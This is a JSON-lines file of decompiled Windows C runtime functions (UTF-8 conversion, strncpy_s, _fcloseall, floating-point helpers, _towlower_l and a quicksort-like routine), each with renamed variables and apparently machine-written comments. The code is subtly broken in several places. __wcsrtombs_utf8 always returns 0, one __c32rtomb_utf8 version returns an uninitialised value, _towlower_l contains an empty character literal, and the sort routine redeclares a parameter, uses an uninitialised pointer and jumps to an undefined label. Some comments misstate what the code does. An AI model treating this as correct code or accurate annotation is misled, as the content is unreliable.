{"Function Name": "__crt_mbstring::__mbsrtowcs_utf8", "Address": "14001cae0", "Source Code": "\n__uint64 __cdecl\n__crt_mbstring::__mbsrtowcs_utf8\n(wchar_t *param_1, char **param_2, __uint64 param_3, _Mbstatet *param_4)\n{\n    wchar32 wVar2; // Variable to hold the wide character value\n    wchar_t *pwVar3; // Pointer to the output wide character string\n    char *pcVar5; // Pointer to the input multi-byte string\n    __uint64 _Var6; // Variable to hold the return value of the conversion function\n    wchar32 local_res8[2]; // Array to hold the converted wide character(s)\n\n    pcVar5 = *param_2; // Initialize pcVar5 with the input string\n\n    // Check if the output buffer is NULL\n    if (param_1 == (wchar_t *)0x0) {\n        while (true) {\n            // Convert multi-byte character to wide character\n            _Var6 = __mbrtoc32_utf8((wchar32 *)0x0, pcVar5, (pcVar5[1] == '\\0') ? 2 : (pcVar5[2] != '\\0') + 3, param_4);\n            // Check for conversion error\n            if (_Var6 == 0xffffffffffffffff) goto LAB_14001cbd9;\n            // Break if no more characters to convert\n            if (_Var6 == 0) break;\n            pcVar5 += _Var6; // Move to the next multi-byte character\n        }\n    } else {\n        pwVar3 = param_1; // Set output pointer to the start of the output buffer\n        if (param_3 != 0) { // Check if there is space in the output buffer\n            do {\n                // Convert multi-byte character to wide character\n                _Var6 = __mbrtoc32_utf8(local_res8, pcVar5, (pcVar5[1] == '\\0') ? 2 : (pcVar5[2] != '\\0') + 3, param_4);\n                // Check for conversion error\n                if (_Var6 == 0xffffffffffffffff) {\n                    *param_2 = pcVar5; // Update input pointer to the current position\n                    goto LAB_14001cbd9;\n                }\n                // Break if no more characters to convert\n                if (_Var6 == 0) {\n                    *pwVar3 = L'\\0'; // Null-terminate the output string\n                    break;\n                }\n                wVar2 = local_res8[0]; // Get the converted wide character\n                // Check if the character is a surrogate\n                if (0xffff < (uint)local_res8[0]) {\n                    if (param_3 < 2) break; // Break if not enough space for surrogate pair\n                    local_res8[0] += L'\\xffff0000'; // Adjust for surrogate pair\n                    param_3--; // Decrement available space\n                    *pwVar3++ = (ushort)((uint)local_res8[0] >> 10) | 0xd800; // Store high surrogate\n                    wVar2 = (wchar32)((ushort)local_res8[0] & 0x3ff | 0xdc00); // Store low surrogate\n                }\n                *pwVar3++ = (wchar_t)wVar2; // Store the wide character\n                param_3--; // Decrement available space\n            } while (param_3 != 0); // Continue until space runs out\n        }\n        *param_2 = pcVar5; // Update input pointer to the current position\n    }\n    return (__uint64)(pwVar3 - param_1); // Return the number of wide characters converted\nLAB_14001cbd9:\n    *(__uint64 *)__doserrno() = 0x2a; // Set error code\n    return 0xffffffffffffffff; // Return error value\n}\n"}
{"Function Name": "__crt_mbstring::__wcsrtombs_utf8", "Address": "14001cc58", "Source Code": "\n__uint64 __cdecl\n__crt_mbstring::__wcsrtombs_utf8\n(char *param_1,wchar_t **param_2,__uint64 param_3,_Mbstatet *param_4)\n{\n    __uint64 _Var1; // Variable to store the return value of character conversion\n    wchar16 *pwVar2 = *param_2; // Pointer to the current wide character\n    wchar16 *pwVar3 = pwVar2; // Pointer to track the start of the wide character string\n    char local_50[8]; // Local buffer for character conversion\n    ulonglong local_48 = DAT_140038080 ^ (ulonglong)local_50; // Security cookie for stack protection\n\n    if (param_1 == (char *)0x0) { // Check if output buffer is NULL\n        while ((_Var1 = __c16rtomb_utf8(local_50, *pwVar2, param_4), _Var1 != 0xffffffffffffffff && // Convert wide character to UTF-8\n                (_Var1 == 0 || (local_50[_Var1 - 1] != '\\0')))) { // Check for valid conversion\n            pwVar2++; // Move to the next wide character\n        }\n    } else {\n        while (true) { // Loop for converting wide characters to UTF-8\n            char *pcVar4 = (param_3 > 3) ? param_1 : local_50; // Determine output buffer based on remaining size\n            _Var1 = __c16rtomb_utf8(pcVar4, *pwVar2, param_4); // Convert wide character to UTF-8\n            if (_Var1 == 0xffffffffffffffff) { // Check for conversion error\n                *param_2 = pwVar3; // Set output pointer to the start of the wide character string\n                goto end; // Exit the loop\n            }\n            if (pcVar4 != param_1) { // Check if using local buffer\n                if (param_3 < _Var1) goto end; // Check if there is enough space in output buffer\n                FUN_14000c330((undefined8 *)param_1, (undefined8 *)pcVar4, _Var1); // Copy converted characters to output buffer\n            }\n            if ((_Var1 != 0) && (param_1[_Var1 - 1] == '\\0')) break; // Break if null terminator is found\n            pwVar2++; // Move to the next wide character\n            if (_Var1 != 0) { // If conversion was successful\n                pwVar3 = pwVar2; // Update the pointer to the last successfully converted character\n            }\n            param_3 -= _Var1; // Decrease remaining size\n            param_1 += _Var1; // Move output buffer pointer forward\n        }\n        pwVar3 = (wchar16 *)0x0; // Reset pointer if no characters were converted\n    }\nend:\n    *param_2 = pwVar3; // Update the output pointer to the last converted character\n    __security_check_cookie(local_48 ^ (ulonglong)local_50); // Check for stack corruption\n    return 0; // Return 0 indicating success\n}\n"}
{"Function Name": "strncpy_s", "Address": "14001cd74", "Source Code": "\nerrno_t __cdecl strncpy_s(char *destinationBuffer, rsize_t destinationSize, char *sourceBuffer, rsize_t maxCharacters)\n{\n    char currentChar; // Variable to hold the current character from source\n    ulong *errnoPointer; // Pointer to hold the address of errno\n    char *destinationPointer; // Pointer to traverse the destination\n    ulong errorCode; // Variable to hold error code\n    rsize_t remainingCharacters; // Remaining count of characters to copy\n\n    // Check if _MaxCount is zero\n    if (maxCharacters == 0) {\n        // Check if destination is null\n        if (destinationBuffer == (char *)0x0) {\n            // If size in bytes is zero, return success\n            if (destinationSize == 0) {\n                return 0;\n            }\n        } else {\n            // If size in bytes is not zero, set destination to null terminator and return success\n            if (destinationSize != 0) {\n                *destinationBuffer = '\\0';\n                return 0;\n            }\n        }\n    } else if (destinationBuffer != (char *)0x0) { // Check if destination is not null\n        destinationPointer = destinationBuffer; // Initialize destination pointer\n        remainingCharacters = maxCharacters; // Set remaining count to max count\n\n        // Check if source is not null\n        if (sourceBuffer != (char *)0x0) {\n            do {\n                currentChar = *sourceBuffer; // Get current character from source\n                *destinationBuffer = currentChar; // Copy character to destination\n                sourceBuffer++; // Move to next character in source\n                destinationBuffer++; // Move to next position in destination\n                if (currentChar == '\\0') break; // Break if null terminator is found\n                remainingCharacters--; // Decrement remaining count\n            } while (remainingCharacters != 0); // Continue until remaining count is zero\n            if (remainingCharacters == 0) {\n                *destinationBuffer = '\\0'; // Null terminate if max count reached\n            }\n        }\n        if (remainingCharacters != 0) {\n            return 0; // Return success if there is space left in destination\n        }\n        *destinationBuffer = '\\0'; // Null terminate the destination\n        errnoPointer = __doserrno(); // Get pointer to errno\n        errorCode = 0x22; // Set error code for buffer too small\n        goto LAB_14001cda0; // Jump to error handling\n    }\n\n    errnoPointer = __doserrno(); // Get pointer to errno\n    errorCode = 0x16; // Set error code for null pointer\nLAB_14001cda0:\n    *errnoPointer = errorCode; // Set errno to the error code\n    FUN_14000ecf8(); // Call error handling function\n    return errorCode; // Return error code\n}\n"}
{"Function Name": "_get_fpsr", "Address": "14001ce60", "Source Code": "\nundefined4 get_fpsr(void) // Function declaration for _get_fpsr, returning an undefined4 type\n{\n    return mxcsr; // Return the value of the MXCSR register\n}\n"}
{"Function Name": "FUN_14001ce70", "Address": "14001ce70", "Source Code": "\nvoid FUN_14001ce70(undefined4 input_value) // Function definition with a parameter of type undefined4\n{\n    mxcsr_value = input_value; // Assign the value of param_1 to the MXCSR variable\n}\n"}
{"Function Name": "_fclrf", "Address": "14001ce7a", "Source Code": "\nvoid clearFloatingPointControl(void) // Function definition for _fclrf\n{\n    floatingPointControlStatusRegister &= 0xffffffc0; // Clear specific bits in the MXCSR register\n}\n"}
{"Function Name": "KERNEL32.DLL::GetStringTypeW", "Address": "14001ceb0", "Source Code": "\n// Function declaration for GetStringTypeW\nBOOL __stdcall GetStringTypeW(DWORD infoType, LPCWSTR sourceString, int sourceLength, LPWORD charType)\n{\n    // Call the actual implementation of GetStringTypeW with the provided parameters\n    return GetStringTypeW(infoType, sourceString, sourceLength, charType);\n}\n"}
{"Function Name": "__crt_mbstring::__c32rtomb_utf8", "Address": "14001ceb8", "Source Code": "\n__uint64 __cdecl __crt_mbstring::__c32rtomb_utf8(char *output_buffer, wchar32 input_wide_char, _Mbstatet *mbstate_ptr)\n{\n    ulong *dos_error_ptr; // Pointer to an unsigned long variable\n    byte least_significant_byte;    // Variable to hold a byte value\n    longlong byte_count; // Variable to hold a long long value for loop counter\n    longlong unused_variable; // Variable to hold a long long value (not initialized)\n    byte utf8_prefix;    // Variable to hold a byte value for UTF-8 prefix\n\n    // Check if the output buffer is not null\n    if (output_buffer != (char *)0x0) {\n        // Check if the input wide character is not null\n        if (input_wide_char != L'\\0') {\n            // Check if the character fits in a single byte\n            if ((input_wide_char & 0xffffff80U) == 0) {\n                *output_buffer = (char)input_wide_char; // Store the character directly\n                return 1; // Return success\n            }\n            // Check if the character fits in two bytes\n            if ((input_wide_char & 0xfffff800U) == 0) {\n                byte_count = 1; // Set byte count for two-byte character\n                utf8_prefix = 0xc0; // Set prefix for two-byte UTF-8\n            } \n            // Check if the character fits in three bytes\n            else if ((input_wide_char & 0xffff0000U) == 0) {\n                // Check if the character is valid for UTF-8 encoding\n                if ((uint)(input_wide_char + L'\\xffff2800') < 0x800) {\n                    *(undefined8 *)mbstate_ptr = 0; // Clear state\n                    dos_error_ptr = __doserrno(); // Get DOS error number\n                    *dos_error_ptr = 0x2a; // Set error code\n                    return 0xffffffffffffffff; // Return error\n                }\n                byte_count = 2; // Set byte count for three-byte character\n                utf8_prefix = 0xe0; // Set prefix for three-byte UTF-8\n            } \n            // Handle four-byte characters\n            else {\n                // Check if the character is valid for UTF-8 encoding\n                if (((input_wide_char & 0xffe00000U) != 0) || (0x10ffff < (uint)input_wide_char)) {\n                    goto LAB_14001cf56; // Jump to error handling\n                }\n                byte_count = 3; // Set byte count for four-byte character\n                utf8_prefix = 0xf0; // Set prefix for four-byte UTF-8\n            }\n            // Loop to encode the character into UTF-8\n            do {\n                least_significant_byte = (byte)input_wide_char; // Get the least significant byte\n                input_wide_char = (uint)input_wide_char >> 6; // Shift right for next byte\n                output_buffer[byte_count] = least_significant_byte & 0x3f | 0x80; // Set the byte with UTF-8 continuation bit\n                byte_count = byte_count - 1; // Decrement byte count\n            } while (byte_count != 0); // Continue until all bytes are processed\n            *output_buffer = (byte)input_wide_char | utf8_prefix; // Set the first byte with prefix\n            *(undefined8 *)mbstate_ptr = 0; // Clear state\n            return unused_variable + 1; // Return the number of bytes written\n        }\n        *output_buffer = (char)input_wide_char; // Handle null character case\n    }\n    *(undefined8 *)mbstate_ptr = 0; // Clear state\n    return 1; // Return success for null character\n}\n"}
{"Function Name": "__crt_mbstring::__c32rtomb_utf8", "Address": "14001cf70", "Source Code": "\n__uint64 __cdecl __crt_mbstring::__c32rtomb_utf8(char *output_buffer, wchar32 input_wide_char, _Mbstatet *mbstate_ptr)\n{\n    ulong *dos_error_ptr; // Pointer to an unsigned long variable\n    byte current_byte;    // Variable to hold byte value\n    longlong byte_count; // Variable to hold long long value for loop counter\n    longlong return_value; // Variable to hold long long value for return value\n    byte first_byte;    // Variable to hold the first byte of UTF-8 encoding\n\n    // Check if the output buffer is not null\n    if (output_buffer != (char *)0x0) {\n        // Check if the input wide character is not null\n        if (input_wide_char != L'\\0') {\n            // Check if the character fits in a single byte\n            if ((input_wide_char & 0xffffff80U) == 0) {\n                *output_buffer = (char)input_wide_char; // Store the character directly\n                return 1; // Return success\n            }\n            // Check if the character fits in two bytes\n            if ((input_wide_char & 0xfffff800U) == 0) {\n                byte_count = 1; // Set the number of bytes to encode\n                first_byte = 0xc0; // Set the first byte for two-byte UTF-8\n            } \n            // Check if the character fits in three bytes\n            else if ((input_wide_char & 0xffff0000U) == 0) {\n                // Validate the character range\n                if ((uint)(input_wide_char + L'\\xffff2800') < 0x800) {\n                    *(undefined8 *)mbstate_ptr = 0; // Clear the state\n                    dos_error_ptr = __doserrno(); // Get the DOS error number\n                    *dos_error_ptr = 0x2a; // Set error code for invalid character\n                    return 0xffffffffffffffff; // Return error\n                }\n                byte_count = 2; // Set the number of bytes to encode\n                first_byte = 0xe0; // Set the first byte for three-byte UTF-8\n            } \n            // Handle characters that require four bytes\n            else {\n                // Validate the character range\n                if (((input_wide_char & 0xffe00000U) != 0) || (0x10ffff < (uint)input_wide_char)) {\n                    *(undefined8 *)mbstate_ptr = 0; // Clear the state\n                    dos_error_ptr = __doserrno(); // Get the DOS error number\n                    *dos_error_ptr = 0x2a; // Set error code for invalid character\n                    return 0xffffffffffffffff; // Return error\n                }\n                byte_count = 3; // Set the number of bytes to encode\n                first_byte = 0xf0; // Set the first byte for four-byte UTF-8\n            }\n            // Loop to encode the remaining bytes\n            do {\n                current_byte = (byte)input_wide_char; // Get the current byte\n                input_wide_char = (uint)input_wide_char >> 6; // Shift the character for the next byte\n                output_buffer[byte_count] = current_byte & 0x3f | 0x80; // Set the byte with UTF-8 continuation marker\n                byte_count = byte_count - 1; // Decrement the byte counter\n            } while (byte_count != 0); // Continue until all bytes are set\n            *output_buffer = (byte)input_wide_char | first_byte; // Set the first byte of UTF-8\n            *(undefined8 *)mbstate_ptr = 0; // Clear the state\n            return return_value + 1; // Return the number of bytes written\n        }\n        *output_buffer = (char)input_wide_char; // Handle null character case\n    }\n    *(undefined8 *)mbstate_ptr = 0; // Clear the state\n    return 1; // Return success for null character\n}\n"}
{"Function Name": "_fcloseall", "Address": "14001cf78", "Source Code": "\nint __cdecl _fcloseall(void) // Function to close all open file streams\n{\n    int returnValue; // Variable to store the return value of fclose\n    int closedFileCount = 0; // Counter for successfully closed files\n    __acrt_lock(8); // Acquire a lock to ensure thread safety\n    for (int fileDescriptorIndex = 3; fileDescriptorIndex != DAT_14003a458; fileDescriptorIndex++) { // Loop through file descriptors starting from index 3\n        longlong fileStreamPointer = *(longlong *)(DAT_14003a460 + (longlong)fileDescriptorIndex * 8); // Get the file stream pointer\n        if (fileStreamPointer != 0) { // Check if the file stream pointer is valid\n            // Check if the file is open and attempt to close it\n            if (((*(uint *)(fileStreamPointer + 0x14) >> 0xd & 1) != 0) && \n                (returnValue = fclose(*(FILE **)(DAT_14003a460 + (longlong)fileDescriptorIndex * 8)), returnValue != -1)) {\n                closedFileCount++; // Increment the counter for successfully closed files\n            }\n            DeleteCriticalSection((LPCRITICAL_SECTION)(fileStreamPointer + 0x30)); // Delete the critical section associated with the file\n            _free_base(*(LPVOID *)(DAT_14003a460 + (longlong)fileDescriptorIndex * 8)); // Free the memory allocated for the file stream\n            *(undefined8 *)(DAT_14003a460 + (longlong)fileDescriptorIndex * 8) = 0; // Set the file stream pointer to null\n        }\n    }\n    __acrt_unlock(8); // Release the lock\n    return closedFileCount; // Return the count of successfully closed files\n}\n"}
{"Function Name": "__acrt_stdio_free_buffer_nolock", "Address": "14001d02c", "Source Code": "\nvoid __acrt_stdio_free_buffer_nolock(undefined8 *buffer_ptr)\n{\n    // Check if specific flags in the 0x14 offset of param_1 are set\n    if (((*(uint *)((longlong)buffer_ptr + 0x14) >> 0xd & 1) != 0) && // Check if the 13th bit is set\n        ((*(uint *)((longlong)buffer_ptr + 0x14) >> 6 & 1) != 0)) {   // Check if the 6th bit is set\n        \n        // Free the memory pointed to by the second element of param_1\n        free_memory((LPVOID)buffer_ptr[1]);\n        \n        // Acquire a lock to ensure thread safety\n        acquire_lock();\n        \n        // Clear the specific bits in the 0x14 offset of param_1\n        *(uint *)((longlong)buffer_ptr + 0x14) &= 0xfffffebf;\n        \n        // Release the lock\n        release_lock();\n        \n        // Set the second element of param_1 to 0, indicating it's no longer valid\n        buffer_ptr[1] = 0;\n        \n        // Set the first element of param_1 to 0, indicating it's no longer valid\n        *buffer_ptr = 0;\n        \n        // Set the third element of param_1 to 0, indicating it's no longer valid\n        *(undefined4 *)(buffer_ptr + 2) = 0;\n    }\n}\n"}
{"Function Name": "_isatty", "Address": "14001d06c", "Source Code": "\nint __cdecl _isatty(int file_handle)\n{\n    ulong *error_pointer; // Pointer to store the address of the DOS error number\n\n    if (file_handle == -2) { // Check if the file handle is -2 (invalid handle)\n        error_pointer = __doserrno(); // Get the address of the DOS error number\n        *error_pointer = 9; // Set the error number to 9 (invalid file handle)\n    } else if ((-1 < file_handle) && ((uint)file_handle < max_file_handle)) { // Check if the file handle is valid\n        // Return the status of the file handle (whether it's a terminal)\n        return *(byte *)((&file_status_array)[(longlong)file_handle >> 6] + 0x38 +\n        (ulonglong)(file_handle & 0x3f) * 0x48) & 0x40;\n    }\n\n    error_pointer = __doserrno(); // Get the address of the DOS error number\n    *error_pointer = 9; // Set the error number to 9 (invalid file handle)\n    cleanup_function(); // Call a function (possibly for cleanup or logging)\n    return 0; // Return 0 indicating failure\n}\n"}
{"Function Name": "FUN_14001d0cc", "Address": "14001d0cc", "Source Code": "\nundefined8\nFUN_14001d0cc(int input_value, undefined8 arg2, undefined8 arg3, undefined8 arg4,\nundefined8 arg5, undefined8 return_value, uint control_word)\n{\n    // Set the floating-point control word with the specified parameter\n    _ctrlfp(control_word, 0xffc0);\n    \n    // Call FUN_1400133c4 with the address of param_1 and check the return value\n    if ((int)FUN_1400133c4(&input_value) == 0) {\n        // If the return value is 0, set the errno based on the math error\n        _set_errno_from_matherr(input_value);\n    }\n    \n    // Return the value of param_6\n    return return_value;\n}\n"}
{"Function Name": "_exception_enabled", "Address": "14001d134", "Source Code": "\nbool _exception_enabled(uint flags, ulonglong status)\n{\n    // Mask the lower 5 bits of param_1 to get uVar1\n    uint masked_flags = flags & 0x1f;\n\n    // Check if exception handling is enabled based on param_1 and param_2\n    if (((flags & 8) == 0) || (-1 < (char)status)) {\n        // Check if the fourth bit is not set or if the 9th bit of param_2 is not set\n        if (((flags & 4) == 0) || ((status >> 9 & 1) == 0)) {\n            // Check if the first bit is not set or if the 10th bit of param_2 is not set\n            if (((flags & 1) == 0) || ((status >> 10 & 1) == 0)) {\n                // If the second bit is set and the 11th bit of param_2 is set\n                if (((flags & 2) != 0) && ((status >> 0xb & 1) != 0)) {\n                    // If the fifth bit is set, set the status flag to 0x10\n                    if ((flags & 0x10) != 0) {\n                        _set_statfp(0x10);\n                    }\n                    // Update uVar1 by masking with 0x1d\n                    masked_flags = flags & 0x1d;\n                }\n            } else {\n                // If the first bit is set, set the status flag to 8 and update uVar1\n                _set_statfp(8);\n                masked_flags = flags & 0x1e;\n            }\n        } else {\n            // If the fourth bit is set, set the status flag to 4 and update uVar1\n            _set_statfp(4);\n            masked_flags = flags & 0x1b;\n        }\n    } else {\n        // If the third bit is set, set the status flag to 1 and update uVar1\n        _set_statfp(1);\n        masked_flags = flags & 0x17;\n    }\n\n    // Check if the fifth bit is set and the 12th bit of param_2 is set\n    if (((flags & 0x10) != 0) && ((status >> 0xc & 1) != 0)) {\n        // Set the status flag to 0x20 and clear the 5th bit in uVar1\n        _set_statfp(0x20);\n        masked_flags &= 0xffffffef;\n    }\n\n    // Return true if uVar1 is zero, indicating no exceptions are enabled\n    return masked_flags == 0;\n}\n"}
{"Function Name": "FUN_14001d44c", "Address": "14001d44c", "Source Code": "\nulonglong FUN_14001d44c(ulonglong input_value)\n{\n    // Perform a bitwise OR operation with the constant 0x8000000000000\n    // This sets the 47th bit of the input parameter 'param_1'\n    return input_value | 0x8000000000000;\n}\n"}
{"Function Name": "FUN_14001d468", "Address": "14001d468", "Source Code": "\n// Function that takes an unsigned integer as input and returns an unsigned integer\nuint bitwise_or_with_constant(uint input_value)\n{\n    // Perform a bitwise OR operation with 0x400000 and return the result\n    return input_value | 0x400000;\n}\n"}
{"Function Name": "_towlower_l", "Address": "14001d478", "Source Code": "\nwint_t __cdecl _towlower_l(wint_t input_character, _locale_t locale_pointer)\n{\n    WCHAR result_character_array[8] = { L'\\xffff' }; // Array to hold the result character, initialized to an invalid value\n    longlong locale_update_context; // Variable for locale update context\n    longlong locale_pointers; // Variable for locale pointers\n\n    if (input_character != 0xffff) { // Check if the input character is not the invalid value\n        result_character_array[0] = input_character; // Store the input character in the result array\n        _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&locale_update_context, (__crt_locale_pointers *)locale_pointer); // Update the locale context\n        \n        if (*(wchar_t **)(locale_pointers + 0x138) == (wchar_t *)0x0) { // Check if the locale pointer is null\n            if ((ushort)(result_character_array[0] + L'') < 0x1a) { // Check if the character is in a specific range\n                result_character_array[0] += L' '; // Convert to lowercase by adding a space\n            }\n        } else if ((ushort)result_character_array[0] < 0x100) { // Check if the character is a single-byte character\n            if (iswctype(result_character_array[0], 1) != 0) { // Check if the character is of a certain type\n                result_character_array[0] = (WCHAR)*(byte *)(*(longlong *)(locale_pointers + 0x110) + (ulonglong)(ushort)result_character_array[0]); // Convert to lowercase using locale-specific mapping\n            }\n        } else { // Handle multi-byte characters\n            if (__acrt_LCMapStringW(*(wchar_t **)(locale_pointers + 0x138), 0x100, (undefined1 (*) [32])result_character_array, 1, result_character_array, 1) != 0) { // Map the character to lowercase using the locale\n                result_character_array[0] = result_character_array[0]; // No change if mapping was successful\n            }\n        }\n    }\n    return result_character_array[0]; // Return the converted lowercase character\n}\n"}
{"Function Name": "FUN_14001d540", "Address": "14001d540", "Source Code": "\nvoid FUN_14001d540(undefined1 *input_array, ulonglong element_count, ulonglong element_size, undefined *error_pointer)\n{\n    undefined1 temp_value; // Variable to hold a value during swapping\n    int function_return; // Variable to hold return values from function calls\n    ulong *error_pointer; // Pointer for error handling\n    longlong midpoint; // Variable for calculations\n    undefined1 *swap_pointer_1; // Pointer for swapping operations\n    undefined1 *swap_pointer_2; // Pointer for swapping operations\n    undefined1 *mid_pointer; // Pointer for swapping operations\n    undefined1 *end_pointer; // Pointer for swapping operations\n    ulonglong current_element_count; // Variable for calculating the number of elements\n    undefined1 *end_of_range; // Pointer for the end of the range\n    undefined8 stack_start[62]; // Stack array for storing pointers\n    undefined8 stack_end[62]; // Stack array for storing pointers\n    longlong stack_counter = 0; // Counter for the stack arrays\n\n    // Check for invalid parameters\n    if ((((input_array == (undefined1 *)0x0) && (element_count != 0)) || (element_size == 0)) || (error_pointer == (undefined *)0x0)) {\n        error_pointer = __doserrno(); // Get the error number\n        *error_pointer = 0x16; // Set the error code\n        FUN_14000ecf8(); // Call error handling function\n        FUN_14001d8df(); // Call cleanup function\n        return; // Exit the function\n    }\n    // Check if param_2 is less than 2\n    if (element_count < 2) {\n        return; // Exit the function if condition is met\n    }\n    end_of_range = input_array + (element_count - 1) * element_size; // Calculate the end pointer\n\n    // Loop while the number of elements is greater than 8\n    while (current_element_count = (ulonglong)((longlong)end_of_range - (longlong)input_array) / element_size + 1, 8 < current_element_count) {\n        midpoint = (current_element_count >> 1) * element_size; // Calculate the midpoint\n        mid_pointer = input_array + midpoint; // Set pointer to midpoint\n        function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(input_array, mid_pointer); // Call a function with parameters\n        // If the function call is successful and pointers are not equal\n        if (0 < function_return && input_array != mid_pointer) {\n            for (ulonglong swap_count = element_size; swap_count != 0; swap_count--) { // Loop for swapping\n                temp_value = mid_pointer[-midpoint]; // Store value for swapping\n                mid_pointer[-midpoint] = *mid_pointer; // Swap values\n                *mid_pointer = temp_value; // Complete the swap\n                mid_pointer++; // Move to the next element\n            }\n        }\n        function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(input_array, end_of_range); // Call a function with parameters\n        // If the function call is successful and pointers are not equal\n        if (0 < function_return && input_array != end_of_range) {\n            swap_pointer_2 = end_of_range; // Set pointer to end\n            for (ulonglong swap_count = element_size; swap_count != 0; swap_count--) { // Loop for swapping\n                temp_value = swap_pointer_2[(longlong)input_array - (longlong)end_of_range]; // Store value for swapping\n                swap_pointer_2[(longlong)input_array - (longlong)end_of_range] = *swap_pointer_2; // Swap values\n                *swap_pointer_2 = temp_value; // Complete the swap\n                swap_pointer_2++; // Move to the next element\n            }\n        }\n        function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(mid_pointer); // Call a function with parameters\n        // If the function call is successful and pointers are not equal\n        if (0 < function_return && mid_pointer != end_of_range) {\n            swap_pointer_1 = end_of_range; // Set pointer to end\n            for (ulonglong swap_count = element_size; swap_count != 0; swap_count--) { // Loop for swapping\n                temp_value = swap_pointer_1[(longlong)mid_pointer - (longlong)end_of_range]; // Store value for swapping\n                swap_pointer_1[(longlong)mid_pointer - (longlong)end_of_range] = *swap_pointer_1; // Swap values\n                *swap_pointer_1 = temp_value; // Complete the swap\n                swap_pointer_1++; // Move to the next element\n            }\n        }\n\n        // Check the relative positions of puVar7 and puVar8\n        if (swap_pointer_2 < mid_pointer) {\n            do {\n                swap_pointer_2 += element_size; // Move pointer forward\n                if (mid_pointer <= swap_pointer_2) break; // Break if out of bounds\n                function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(swap_pointer_2); // Call a function with parameters\n            } while (function_return < 1); // Continue if the return value is less than 1\n        } else {\n            do {\n                swap_pointer_2 += element_size; // Move pointer forward\n                if (end_of_range < swap_pointer_2) break; // Break if out of bounds\n                function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(swap_pointer_2); // Call a function with parameters\n            } while (function_return < 1); // Continue if the return value is less than 1\n        }\n\n        // Loop for checking conditions on puVar9\n        do {\n            mid_pointer = end_pointer; // Set puVar8 to puVar9\n            end_pointer -= element_size; // Move pointer backward\n            if (end_pointer <= swap_pointer_1) break; // Break if out of bounds\n            function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(end_pointer); // Call a function with parameters\n        } while (0 < function_return); // Continue if the return value is greater than 0\n\n        // Check the relative positions of puVar7 and puVar9\n        if (swap_pointer_2 <= end_pointer) {\n            if (swap_pointer_2 != end_pointer) { // If pointers are not equal\n                for (ulonglong swap_count = element_size; swap_count != 0; swap_count--) { // Loop for swapping\n                    temp_value = end_pointer[(longlong)swap_pointer_2 - (longlong)end_pointer]; // Store value for swapping\n                    end_pointer[(longlong)swap_pointer_2 - (longlong)end_pointer] = *end_pointer; // Swap values\n                    *end_pointer = temp_value; // Complete the swap\n                    end_pointer++; // Move to the next element\n                }\n            }\n            mid_pointer = swap_pointer_2; // Set puVar8 to puVar7\n            if (swap_pointer_1 != end_pointer) { // If pointers are not equal\n                mid_pointer = swap_pointer_1; // Set puVar8 to puVar6\n            }\n        }\n\n        // Loop for checking conditions on puVar8\n        if (swap_pointer_1 < mid_pointer) {\n            do {\n                mid_pointer -= element_size; // Move pointer backward\n                if (mid_pointer <= swap_pointer_1) break; // Break if out of bounds\n                function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(mid_pointer); // Call a function with parameters\n            } while (function_return == 0); // Continue if the return value is 0\n        } else {\n            do {\n                mid_pointer -= element_size; // Move pointer backward\n                if (mid_pointer <= input_array) break; // Break if out of bounds\n                function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(mid_pointer); // Call a function with parameters\n            } while (function_return == 0); // Continue if the return value is 0\n        }\n\n        // Check if the distance from puVar8 to param_1 is less than from puVar11 to puVar7\n        if ((longlong)mid_pointer - (longlong)input_array < (longlong)end_of_range - (longlong)swap_pointer_2) {\n            if (input_array < mid_pointer) { // If param_1 is less than puVar8\n                stack_start[stack_counter] = input_array; // Store param_1 in stack\n                stack_end[stack_counter] = mid_pointer; // Store puVar8 in stack\n                stack_counter++; // Increment stack counter\n            }\n            input_array = swap_pointer_2; // Update param_1 to puVar7\n            if (end_of_range <= swap_pointer_2) { // If puVar11 is less than or equal to puVar7\n                goto LAB_14001d663; // Jump to cleanup\n            }\n        }\n\n        // Loop for processing elements between param_1 and puVar11\n        for (; input_array < end_of_range; end_of_range -= element_size) {\n            swap_pointer_2 = input_array; // Set puVar7 to param_1\n            mid_pointer = input_array; // Set puVar8 to param_1\n            while (mid_pointer <= end_of_range) { // Loop while within bounds\n                function_return = (*(code *)PTR__guard_dispatch_icall_1400213e8)(mid_pointer, swap_pointer_2); // Call a function with parameters\n                if (0 < function_return) { // If the function call is successful\n                    swap_pointer_2 = mid_pointer; // Update puVar7\n                }\n                mid_pointer += element_size; // Move to the next element\n            }\n            if (swap_pointer_2 != end_of_range) { // If pointers are not equal\n                for (ulonglong swap_count = element_size; swap_count != 0; swap_count--) { // Loop for swapping\n                    temp_value = end_of_range[(longlong)swap_pointer_2 - (longlong)end_of_range]; // Store value for swapping\n                    end_of_range[(longlong)swap_pointer_2 - (longlong)end_of_range] = *end_of_range; // Swap values\n                    *end_of_range = temp_value; // Complete the swap\n                    end_of_range++; // Move to the next element\n                }\n            }\n        }\n        goto LAB_14001d663; // Jump to cleanup\n    LAB_14001d88c:\n        if (swap_pointer_2 < end_of_range) { // If puVar7 is less than puVar11\n            stack_start[stack_counter] = swap_pointer_2; // Store puVar7 in stack\n            stack_end[stack_counter] = end_of_range; // Store puVar11 in stack\n            stack_counter++; // Increment stack counter\n        }\n        end_of_range = mid_pointer; // Update puVar11\n        if (mid_pointer <= input_array) { // If puVar8 is less than or equal to param_1\n        LAB_14001d663:\n            midpoint = stack_counter - 1; // Get the last index of the stack\n            if (stack_counter > 0) { // If there are elements in the stack\n                input_array = (undefined1 *)stack_start[midpoint]; // Restore param_1 from stack\n                end_of_range = (undefined1 *)stack_end[midpoint]; // Restore puVar11 from stack\n                goto LAB_14001d5e0; // Jump to cleanup\n            }\n            goto code_r0x00014001d8df; // Jump to cleanup\n        }\n        goto LAB_14001d5e0; // Jump to cleanup\n    }\n}\n"}
